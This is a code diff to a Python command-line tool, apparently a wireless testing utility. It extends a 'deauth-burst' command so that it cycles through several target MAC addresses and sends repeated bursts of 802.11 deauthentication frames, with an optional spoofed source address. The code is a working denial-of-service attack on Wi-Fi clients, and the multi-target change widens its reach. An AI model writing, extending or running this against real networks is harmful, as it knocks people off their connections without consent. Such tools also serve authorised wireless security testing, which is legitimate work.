@@ -1522,7 +1522,8 @@ def main(argv: list[str]) -> int:
     p_deauth_burst.add_argument("--channel", type=int, default=1)
     p_deauth_burst.add_argument("--bw", type=int, choices=(20, 40, 80), default=20)
     p_deauth_burst.add_argument("--igi", type=_parse_int, default=-1)
-    p_deauth_burst.add_argument("--target-mac", required=True)
+    p_deauth_burst.add_argument("--target-mac", default="")
+    p_deauth_burst.add_argument("--target-macs", default="")
     p_deauth_burst.add_argument("--bssid", required=True)
     p_deauth_burst.add_argument("--source-mac", default=None)
     p_deauth_burst.add_argument("--reason", type=int, default=7)
@@ -2207,6 +2208,19 @@ def main(argv: list[str]) -> int:
             sent = 0
             captured = 0
             try:
+                raw_targets: list[str] = []
+                if str(getattr(args, "target_macs", "") or "").strip():
+                    raw_targets += [x.strip() for x in re.split(r"[,\s]+", str(args.target_macs)) if x.strip()]
+                if str(getattr(args, "target_mac", "") or "").strip():
+                    raw_targets.append(str(args.target_mac).strip())
+                targets: list[str] = []
+                for t in raw_targets:
+                    if t not in targets:
+                        targets.append(t)
+                if not targets:
+                    raise RuntimeError("missing --target-mac/--target-macs")
+                target_idx = 0
+
                 interval_ms = int(getattr(args, "burst_interval_ms", 2000))
                 duration_s = float(getattr(args, "burst_duration_s", 0.0))
                 t_end: Optional[float] = None if duration_s <= 0.0 else (time.monotonic() + max(0.0, duration_s))
@@ -2217,10 +2231,12 @@ def main(argv: list[str]) -> int:
                         break
                     now = time.monotonic()
                     if now >= next_send:
+                        dest = targets[target_idx % len(targets)]
+                        target_idx += 1
                         burst_size = max(0, int(getattr(args, "burst_size", 20)))
                         for _ in range(burst_size):
                             dev.send_deauth(
-                                dest=str(args.target_mac),
+                                dest=str(dest),
                                 bssid=str(args.bssid),
                                 source=(str(args.source_mac) if getattr(args, "source_mac", None) else None),
                                 reason=int(args.reason),
